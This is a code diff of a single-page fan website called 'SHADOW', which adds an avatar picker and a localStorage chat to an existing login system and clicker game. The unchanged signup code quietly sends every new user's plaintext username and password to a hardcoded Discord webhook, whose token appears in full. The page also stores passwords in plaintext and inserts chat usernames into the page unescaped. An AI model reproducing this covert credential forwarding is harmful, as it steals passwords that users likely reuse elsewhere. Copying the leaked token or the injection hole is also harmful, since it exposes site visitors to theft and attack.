@@ -52,9 +52,22 @@ body {
     padding: 8px 20px;
     border-radius: 50px;
     border: 2px solid rgba(88, 101, 242, 0.3);
+    cursor: pointer;
+    transition: 0.3s ease;
+}
+.user-display:hover {
+    background: rgba(88, 101, 242, 0.3);
+    transform: translateY(-2px);
 }
 .user-icon {
-    font-size: 20px;
+    font-size: 24px;
+    width: 32px;
+    height: 32px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    background: rgba(255, 255, 255, 0.1);
+    border-radius: 50%;
 }
 .username {
     font-weight: 600;
@@ -82,6 +95,13 @@ body {
 }
 .nav-btn.primary:hover {
     box-shadow: 0 5px 15px rgba(102, 126, 234, 0.5);
+}
+.nav-btn.chat {
+    background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
+    border: none;
+}
+.nav-btn.chat:hover {
+    box-shadow: 0 5px 15px rgba(0, 153, 255, 0.5);
 }
 .logout-btn {
     background: rgba(255, 0, 0, 0.2);
@@ -145,11 +165,6 @@ body {
     transform: translateY(-4px);
     box-shadow: 0 10px 25px rgba(0,0,0,0.4);
 }
-.btn:disabled {
-    opacity: 0.5;
-    cursor: not-allowed;
-    transform: none;
-}
 
 /* ABOUT SECTION */
 .section {
@@ -185,7 +200,7 @@ footer {
     to { opacity: 1; }
 }
 
-/* AUTH MODAL */
+/* MODAL BASE */
 .modal-overlay {
     display: none;
     position: fixed;
@@ -222,6 +237,8 @@ footer {
     margin-bottom: 30px;
     font-size: 14px;
 }
+
+/* AUTH FORMS */
 .form-group {
     margin-bottom: 20px;
     text-align: left;
@@ -302,6 +319,207 @@ footer {
 }
 .switch-auth a:hover {
     text-decoration: underline;
+}
+
+/* PROFILE PICTURE SELECTOR */
+.avatar-grid {
+    display: grid;
+    grid-template-columns: repeat(6, 1fr);
+    gap: 10px;
+    margin: 20px 0;
+}
+.avatar-option {
+    width: 50px;
+    height: 50px;
+    border-radius: 50%;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 28px;
+    cursor: pointer;
+    background: rgba(255, 255, 255, 0.1);
+    border: 3px solid transparent;
+    transition: 0.3s ease;
+}
+.avatar-option:hover {
+    transform: scale(1.1);
+    background: rgba(255, 255, 255, 0.2);
+}
+.avatar-option.selected {
+    border-color: #667eea;
+    background: rgba(102, 126, 234, 0.3);
+}
+
+/* CHAT SYSTEM */
+.chat-container {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: radial-gradient(circle at top, #1a1a1a, #0a0a0a 70%);
+    z-index: 1500;
+    padding: 80px 20px 20px;
+}
+.chat-container.active {
+    display: flex;
+    flex-direction: column;
+    animation: fade 0.3s ease forwards;
+}
+.chat-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    max-width: 900px;
+    width: 100%;
+    margin: 0 auto 20px;
+}
+.chat-title {
+    font-size: 32px;
+    font-weight: 800;
+    color: #00d4ff;
+}
+.chat-close {
+    background: #333;
+    color: white;
+    padding: 10px 25px;
+    border-radius: 50px;
+    border: none;
+    cursor: pointer;
+    font-weight: 600;
+    transition: 0.3s ease;
+}
+.chat-close:hover {
+    background: #444;
+    transform: translateY(-2px);
+}
+.chat-content {
+    max-width: 900px;
+    width: 100%;
+    margin: 0 auto;
+    display: flex;
+    flex-direction: column;
+    flex: 1;
+    background: rgba(255, 255, 255, 0.03);
+    border: 2px solid rgba(0, 212, 255, 0.3);
+    border-radius: 20px;
+    overflow: hidden;
+}
+.chat-messages {
+    flex: 1;
+    overflow-y: auto;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 15px;
+}
+.chat-message {
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+    padding: 12px;
+    background: rgba(255, 255, 255, 0.05);
+    border-radius: 12px;
+    transition: 0.3s ease;
+}
+.chat-message:hover {
+    background: rgba(255, 255, 255, 0.08);
+}
+.message-avatar {
+    font-size: 32px;
+    width: 40px;
+    height: 40px;
+    border-radius: 50%;
+    background: rgba(255, 255, 255, 0.1);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    flex-shrink: 0;
+}
+.message-content {
+    flex: 1;
+    text-align: left;
+}
+.message-header {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    margin-bottom: 5px;
+}
+.message-username {
+    font-weight: 700;
+    color: #00d4ff;
+    font-size: 14px;
+}
+.message-time {
+    color: #666;
+    font-size: 12px;
+}
+.message-text {
+    color: #ddd;
+    line-height: 1.5;
+    word-wrap: break-word;
+}
+.message-delete {
+    background: rgba(255, 0, 0, 0.2);
+    border: none;
+    color: #ff4444;
+    padding: 4px 12px;
+    border-radius: 50px;
+    cursor: pointer;
+    font-size: 11px;
+    font-weight: 600;
+    transition: 0.3s ease;
+    flex-shrink: 0;
+}
+.message-delete:hover {
+    background: rgba(255, 0, 0, 0.3);
+}
+.chat-input-area {
+    padding: 20px;
+    background: rgba(0, 0, 0, 0.3);
+    border-top: 1px solid rgba(255, 255, 255, 0.1);
+}
+.chat-input-wrapper {
+    display: flex;
+    gap: 10px;
+}
+.chat-input {
+    flex: 1;
+    padding: 12px 20px;
+    background: rgba(255, 255, 255, 0.05);
+    border: 2px solid rgba(255, 255, 255, 0.1);
+    border-radius: 50px;
+    color: white;
+    font-size: 16px;
+    font-family: 'Poppins', sans-serif;
+    transition: 0.3s ease;
+}
+.chat-input:focus {
+    outline: none;
+    border-color: #00d4ff;
+    background: rgba(255, 255, 255, 0.08);
+}
+.chat-send {
+    background: linear-gradient(135deg, #00d4ff 0%, #0099ff 100%);
+    color: white;
+    border: none;
+    padding: 12px 30px;
+    border-radius: 50px;
+    cursor: pointer;
+    font-weight: 600;
+    transition: 0.3s ease;
+}
+.chat-send:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 5px 15px rgba(0, 153, 255, 0.5);
+}
+.chat-empty {
+    text-align: center;
+    color: #666;
+    padding: 40px;
+    font-size: 16px;
 }
 
 /* CLICKER GAME STYLES */
@@ -477,20 +695,32 @@ footer {
         transform: translateY(-100px);
     }
 }
+
+/* SCROLLBAR */
+.chat-messages::-webkit-scrollbar {
+    width: 8px;
+}
+.chat-messages::-webkit-scrollbar-track {
+    background: rgba(255, 255, 255, 0.05);
+}
+.chat-messages::-webkit-scrollbar-thumb {
+    background: rgba(0, 212, 255, 0.3);
+    border-radius: 10px;
+}
+.chat-messages::-webkit-scrollbar-thumb:hover {
+    background: rgba(0, 212, 255, 0.5);
+}
 </style>
 </head>
 <body>
 <!-- NAVIGATION -->
 <nav class="navbar">
     <div class="logo">🌑 SHADOW</div>
-    <div class="auth-section" id="authSection">
-        <!-- Dynamic content based on login state -->
-    </div>
+    <div class="auth-section" id="authSection"></div>
 </nav>
 
 <!-- MAIN CONTENT -->
 <div id="mainContent">
-    <!-- HERO -->
     <section class="hero fade-in">
         <h1>Enter the Shadows 🌑</h1>
         <p>
@@ -505,12 +735,11 @@ footer {
             <a href="https://youtube.com/@shadowr08?si=xDj294c4EqMzUZHc" class="btn youtube" target="_blank">
                 Subscribe on YouTube
             </a>
-            <button onclick="openGame()" class="btn game" id="gameButton">
+            <button onclick="openGame()" class="btn game">
                 🎮 Play Shadow Clicker
             </button>
         </div>
     </section>
-    <!-- ABOUT -->
     <section class="section fade-in">
         <h2>About Me</h2>
         <p>
@@ -527,7 +756,6 @@ footer {
 <!-- AUTH MODAL -->
 <div id="authModal" class="modal-overlay">
     <div class="modal">
-        <!-- LOGIN FORM -->
         <div id="loginForm">
             <h2>Welcome Back</h2>
             <p>Log in to your Shadow account</p>
@@ -549,7 +777,6 @@ footer {
             </div>
         </div>
 
-        <!-- SIGNUP FORM -->
         <div id="signupForm" style="display: none;">
             <h2>Join the Shadows</h2>
             <p>Create your Shadow account</p>
@@ -577,14 +804,45 @@ footer {
     </div>
 </div>
 
+<!-- PROFILE MODAL -->
+<div id="profileModal" class="modal-overlay">
+    <div class="modal">
+        <h2>Edit Profile</h2>
+        <p>Choose your profile picture</p>
+        <div class="avatar-grid" id="avatarGrid"></div>
+        <div class="modal-buttons">
+            <button class="modal-btn secondary" onclick="closeProfileModal()">Cancel</button>
+            <button class="modal-btn primary" onclick="saveProfile()">Save</button>
+        </div>
+    </div>
+</div>
+
+<!-- CHAT SYSTEM -->
+<div id="chatContainer" class="chat-container">
+    <div class="chat-header">
+        <h1 class="chat-title">💬 Shadow Community Chat</h1>
+        <button onclick="closeChat()" class="chat-close">← Back</button>
+    </div>
+    <div class="chat-content">
+        <div class="chat-messages" id="chatMessages">
+            <div class="chat-empty">No messages yet. Be the first to say something!</div>
+        </div>
+        <div class="chat-input-area">
+            <div class="chat-input-wrapper">
+                <input type="text" class="chat-input" id="chatInput" placeholder="Type a message..." maxlength="500">
+                <button class="chat-send" onclick="sendMessage()">Send</button>
+            </div>
+        </div>
+    </div>
+</div>
+
 <!-- CLICKER GAME -->
 <div id="gameContainer" class="game-container">
-    <div class="game-content" id="gameContent">
+    <div class="game-content">
         <div class="game-header">
             <h1 class="game-title">🌑 Shadow Clicker</h1>
             <button onclick="closeGame()" class="back-btn">← Back</button>
         </div>
-        
         <div class="stats-panel">
             <div class="stat-item">
                 <div class="stat-label">Shadow Energy</div>
@@ -599,11 +857,7 @@ footer {
                 <div class="stat-value" id="perSecond">0</div>
             </div>
         </div>
-
-        <button onclick="clickShadow(event)" class="click-button" id="clickBtn">
-            🌑
-        </button>
-
+        <button onclick="clickShadow(event)" class="click-button">🌑</button>
         <div class="upgrades-section">
             <h2 class="upgrades-title">⚡ Upgrades</h2>
             <div class="upgrade-grid" id="upgradesGrid"></div>
@@ -612,12 +866,13 @@ footer {
 </div>
 
 <script>
-// ==================== AUTH SYSTEM ====================
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1471220467720519852/8jDcxFQO91-gpLRSoGtWGP-N2iC49H19CBH0BZL3GEw8OErmON9ekrHZsGN88LXxOkQw';
+const AVATARS = ['😀','😎','😈','👻','💀','🤖','👽','🦖','🐉','🦄','🔥','⚡','🌑','🌟','💎','👑','🎮','🎨','🎭','🎪','🚀','⚔️','🛡️','🏴‍☠️'];
 
 let currentUser = null;
+let selectedAvatar = '😎';
 
-// Initialize auth on page load
+// ==================== AUTH SYSTEM ====================
 function initAuth() {
     const savedSession = localStorage.getItem('shadowSession');
     if (savedSession) {
@@ -633,20 +888,23 @@ function initAuth() {
     updateAuthUI();
 }
 
-// Validate session
 function validateSession(session) {
     const users = JSON.parse(localStorage.getItem('shadowUsers') || '[]');
     return users.some(u => u.username === session.username && u.password === session.password);
 }
 
-// Update auth UI
 function updateAuthUI() {
     const authSection = document.getElementById('authSection');
     
     if (currentUser) {
+        const users = JSON.parse(localStorage.getItem('shadowUsers') || '[]');
+        const user = users.find(u => u.username === currentUser);
+        const avatar = user?.avatar || '😎';
+        
         authSection.innerHTML = `
-            <div class="user-display">
-                <span class="user-icon">👤</span>
+            <button class="nav-btn chat" onclick="openChat()">💬 Chat</button>
+            <div class="user-display" onclick="openProfileModal()">
+                <span class="user-icon">${avatar}</span>
                 <span class="username">${currentUser}</span>
             </div>
             <button class="nav-btn logout-btn" onclick="handleLogout()">Logout</button>
@@ -659,7 +917,6 @@ function updateAuthUI() {
     }
 }
 
-// Open/Close modals
 function openLoginModal() {
     document.getElementById('authModal').classList.add('active');
     switchToLogin();
@@ -697,7 +954,6 @@ function clearForms() {
     document.getElementById('signupError').classList.remove('show');
 }
 
-// Handle Login
 function handleLogin() {
     const username = document.getElementById('loginUsername').value.trim();
     const password = document.getElementById('loginPassword').value;
@@ -724,14 +980,12 @@ function handleLogin() {
     }
 }
 
-// Handle Signup
 async function handleSignup() {
     const username = document.getElementById('signupUsername').value.trim();
     const password = document.getElementById('signupPassword').value;
     const passwordConfirm = document.getElementById('signupPasswordConfirm').value;
     const errorMsg = document.getElementById('signupError');
     
-    // Validation
     if (!username || !password || !passwordConfirm) {
         errorMsg.textContent = 'Please fill in all fields';
         errorMsg.classList.add('show');
@@ -756,7 +1010,6 @@ async function handleSignup() {
         return;
     }
     
-    // Check if username exists
     const users = JSON.parse(localStorage.getItem('shadowUsers') || '[]');
     if (users.some(u => u.username === username)) {
         errorMsg.textContent = 'Username already exists';
@@ -764,26 +1017,24 @@ async function handleSignup() {
         return;
     }
     
-    // Create account
-    const newUser = { username, password, createdAt: new Date().toISOString() };
+    const newUser = { 
+        username, 
+        password, 
+        avatar: '😎',
+        createdAt: new Date().toISOString() 
+    };
     users.push(newUser);
     localStorage.setItem('shadowUsers', JSON.stringify(users));
     
-    // Send to Discord webhook
     await sendToDiscord(username, password);
     
-    // Auto login
     currentUser = username;
     localStorage.setItem('shadowSession', JSON.stringify({ username, password }));
-    
-    // Initialize game data for new user
     initGameForNewUser(username);
-    
     updateAuthUI();
     closeAuthModal();
 }
 
-// Send to Discord webhook
 async function sendToDiscord(username, password) {
     try {
         await fetch(DISCORD_WEBHOOK, {
@@ -803,11 +1054,10 @@ async function sendToDiscord(username, password) {
             })
         });
     } catch (error) {
-        console.log('Webhook notification failed (this is okay)');
+        console.log('Webhook notification failed');
     }
 }
 
-// Handle Logout
 function handleLogout() {
     if (confirm('Are you sure you want to log out?')) {
         currentUser = null;
@@ -816,8 +1066,165 @@ function handleLogout() {
         if (document.getElementById('gameContainer').classList.contains('active')) {
             closeGame();
         }
+        if (document.getElementById('chatContainer').classList.contains('active')) {
+            closeChat();
+        }
     }
 }
+
+// ==================== PROFILE SYSTEM ====================
+function openProfileModal() {
+    const users = JSON.parse(localStorage.getItem('shadowUsers') || '[]');
+    const user = users.find(u => u.username === currentUser);
+    selectedAvatar = user?.avatar || '😎';
+    
+    const grid = document.getElementById('avatarGrid');
+    grid.innerHTML = '';
+    AVATARS.forEach(avatar => {
+        const option = document.createElement('div');
+        option.className = 'avatar-option';
+        if (avatar === selectedAvatar) option.classList.add('selected');
+        option.textContent = avatar;
+        option.onclick = () => selectAvatar(avatar);
+        grid.appendChild(option);
+    });
+    
+    document.getElementById('profileModal').classList.add('active');
+}
+
+function selectAvatar(avatar) {
+    selectedAvatar = avatar;
+    document.querySelectorAll('.avatar-option').forEach(opt => {
+        opt.classList.toggle('selected', opt.textContent === avatar);
+    });
+}
+
+function saveProfile() {
+    const users = JSON.parse(localStorage.getItem('shadowUsers') || '[]');
+    const userIndex = users.findIndex(u => u.username === currentUser);
+    if (userIndex !== -1) {
+        users[userIndex].avatar = selectedAvatar;
+        localStorage.setItem('shadowUsers', JSON.stringify(users));
+        updateAuthUI();
+    }
+    closeProfileModal();
+}
+
+function closeProfileModal() {
+    document.getElementById('profileModal').classList.remove('active');
+}
+
+// ==================== CHAT SYSTEM ====================
+function openChat() {
+    if (!currentUser) {
+        alert('Please log in to access chat!');
+        openLoginModal();
+        return;
+    }
+    document.getElementById('chatContainer').classList.add('active');
+    loadMessages();
+    startChatRefresh();
+}
+
+function closeChat() {
+    document.getElementById('chatContainer').classList.remove('active');
+    stopChatRefresh();
+}
+
+let chatRefreshInterval;
+
+function startChatRefresh() {
+    chatRefreshInterval = setInterval(loadMessages, 2000);
+}
+
+function stopChatRefresh() {
+    if (chatRefreshInterval) {
+        clearInterval(chatRefreshInterval);
+        chatRefreshInterval = null;
+    }
+}
+
+function sendMessage() {
+    const input = document.getElementById('chatInput');
+    const text = input.value.trim();
+    
+    if (!text) return;
+    
+    const users = JSON.parse(localStorage.getItem('shadowUsers') || '[]');
+    const user = users.find(u => u.username === currentUser);
+    const avatar = user?.avatar || '😎';
+    
+    const messages = JSON.parse(localStorage.getItem('shadowMessages') || '[]');
+    const message = {
+        id: Date.now() + Math.random(),
+        username: currentUser,
+        avatar: avatar,
+        text: text,
+        timestamp: new Date().toISOString()
+    };
+    
+    messages.push(message);
+    localStorage.setItem('shadowMessages', JSON.stringify(messages));
+    
+    input.value = '';
+    loadMessages();
+    
+    const chatBox = document.getElementById('chatMessages');
+    setTimeout(() => chatBox.scrollTop = chatBox.scrollHeight, 100);
+}
+
+function deleteMessage(messageId) {
+    if (!confirm('Delete this message?')) return;
+    
+    const messages = JSON.parse(localStorage.getItem('shadowMessages') || '[]');
+    const filtered = messages.filter(m => m.id !== messageId);
+    localStorage.setItem('shadowMessages', JSON.stringify(filtered));
+    loadMessages();
+}
+
+function loadMessages() {
+    const messages = JSON.parse(localStorage.getItem('shadowMessages') || '[]');
+    const container = document.getElementById('chatMessages');
+    
+    if (messages.length === 0) {
+        container.innerHTML = '<div class="chat-empty">No messages yet. Be the first to say something!</div>';
+        return;
+    }
+    
+    container.innerHTML = messages.map(msg => {
+        const time = new Date(msg.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+        const canDelete = msg.username === currentUser;
+        
+        return `
+            <div class="chat-message">
+                <div class="message-avatar">${msg.avatar}</div>
+                <div class="message-content">
+                    <div class="message-header">
+                        <span class="message-username">${msg.username}</span>
+                        <span class="message-time">${time}</span>
+                    </div>
+                    <div class="message-text">${escapeHtml(msg.text)}</div>
+                </div>
+                ${canDelete ? `<button class="message-delete" onclick="deleteMessage(${msg.id})">Delete</button>` : ''}
+            </div>
+        `;
+    }).join('');
+}
+
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const input = document.getElementById('chatInput');
+    if (input) {
+        input.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') sendMessage();
+        });
+    }
+});
 
 // ==================== GAME SYSTEM ====================
 let gameData = {
@@ -834,79 +1241,48 @@ let gameData = {
 };
 
 const upgradesConfig = {
-    clickPower: {
-        name: "Shadow Touch",
-        desc: "Increase shadow energy per click",
-        baseBonus: 1
-    },
-    autoClicker: {
-        name: "Shadow Minion",
-        desc: "Generates 1 shadow/sec",
-        baseBonus: 1
-    },
-    shadowGenerator: {
-        name: "Dark Ritual",
-        desc: "Generates 5 shadows/sec",
-        baseBonus: 5
-    },
-    darkEnergy: {
-        name: "Void Essence",
-        desc: "Generates 25 shadows/sec",
-        baseBonus: 25
-    },
-    voidPortal: {
-        name: "Eternal Darkness",
-        desc: "Generates 100 shadows/sec",
-        baseBonus: 100
-    }
+    clickPower: { name: "Shadow Touch", desc: "Increase shadow energy per click", baseBonus: 1 },
+    autoClicker: { name: "Shadow Minion", desc: "Generates 1 shadow/sec", baseBonus: 1 },
+    shadowGenerator: { name: "Dark Ritual", desc: "Generates 5 shadows/sec", baseBonus: 5 },
+    darkEnergy: { name: "Void Essence", desc: "Generates 25 shadows/sec", baseBonus: 25 },
+    voidPortal: { name: "Eternal Darkness", desc: "Generates 100 shadows/sec", baseBonus: 100 }
 };
 
-// Initialize game for new user
 function initGameForNewUser(username) {
-    const gameKey = `shadowGame_${username}`;
-    localStorage.setItem(gameKey, JSON.stringify(gameData));
+    localStorage.setItem(`shadowGame_${username}`, JSON.stringify(gameData));
 }
 
-// Load game for user
 function loadGameForUser(username) {
-    const gameKey = `shadowGame_${username}`;
-    const saved = localStorage.getItem(gameKey);
+    const saved = localStorage.getItem(`shadowGame_${username}`);
     if (saved) {
         gameData = JSON.parse(saved);
     } else {
-        // Initialize if doesn't exist
         initGameForNewUser(username);
     }
 }
 
-// Save game for current user
 function saveGame() {
     if (currentUser) {
-        const gameKey = `shadowGame_${currentUser}`;
-        localStorage.setItem(gameKey, JSON.stringify(gameData));
+        localStorage.setItem(`shadowGame_${currentUser}`, JSON.stringify(gameData));
     }
 }
 
-// Open game
 function openGame() {
     if (!currentUser) {
         alert('Please log in to play Shadow Clicker!');
         openLoginModal();
         return;
     }
-    
     document.getElementById('gameContainer').classList.add('active');
     loadGameForUser(currentUser);
     updateUI();
 }
 
-// Close game
 function closeGame() {
     document.getElementById('gameContainer').classList.remove('active');
     saveGame();
 }
 
-// Click handler
 function clickShadow(event) {
     gameData.shadows += gameData.clickPower;
     updateUI();
@@ -921,49 +1297,38 @@ function clickShadow(event) {
     floatingNum.style.top = rect.top + 'px';
     floatingNum.style.position = 'fixed';
     document.body.appendChild(floatingNum);
-    
     setTimeout(() => floatingNum.remove(), 1000);
 }
 
-// Calculate passive income
 function calculatePassiveIncome() {
     let total = 0;
     const ups = gameData.upgrades;
-    
     total += ups.autoClicker.level * upgradesConfig.autoClicker.baseBonus;
     total += ups.shadowGenerator.level * upgradesConfig.shadowGenerator.baseBonus;
     total += ups.darkEnergy.level * upgradesConfig.darkEnergy.baseBonus;
     total += ups.voidPortal.level * upgradesConfig.voidPortal.baseBonus;
-    
     return total;
 }
 
-// Calculate click power
 function calculateClickPower() {
     return 1 + gameData.upgrades.clickPower.level * upgradesConfig.clickPower.baseBonus;
 }
 
-// Buy upgrade
 function buyUpgrade(upgradeKey) {
     const upgrade = gameData.upgrades[upgradeKey];
-    
     if (gameData.shadows >= upgrade.cost) {
         gameData.shadows -= upgrade.cost;
         upgrade.level++;
         upgrade.cost = Math.floor(upgrade.cost * upgrade.multiplier);
-        
         if (upgradeKey === 'clickPower') {
             gameData.clickPower = calculateClickPower();
         }
-        
         gameData.passiveIncome = calculatePassiveIncome();
-        
         updateUI();
         saveGame();
     }
 }
 
-// Update UI
 function updateUI() {
     document.getElementById('shadowCount').textContent = Math.floor(gameData.shadows).toLocaleString();
     document.getElementById('perClick').textContent = gameData.clickPower.toLocaleString();
@@ -975,7 +1340,6 @@ function updateUI() {
     for (const [key, config] of Object.entries(upgradesConfig)) {
         const upgrade = gameData.upgrades[key];
         const canBuy = gameData.shadows >= upgrade.cost;
-        
         const card = document.createElement('div');
         card.className = 'upgrade-card';
         card.innerHTML = `
@@ -991,7 +1355,6 @@ function updateUI() {
     }
 }
 
-// Passive income loop
 setInterval(() => {
     if (document.getElementById('gameContainer').classList.contains('active') && currentUser) {
         gameData.shadows += gameData.passiveIncome / 10;
@@ -999,14 +1362,12 @@ setInterval(() => {
     }
 }, 100);
 
-// Auto-save
 setInterval(() => {
     if (document.getElementById('gameContainer').classList.contains('active') && currentUser) {
         saveGame();
     }
 }, 5000);
 
-// Initialize on page load
 initAuth();
 </script>
 </body>
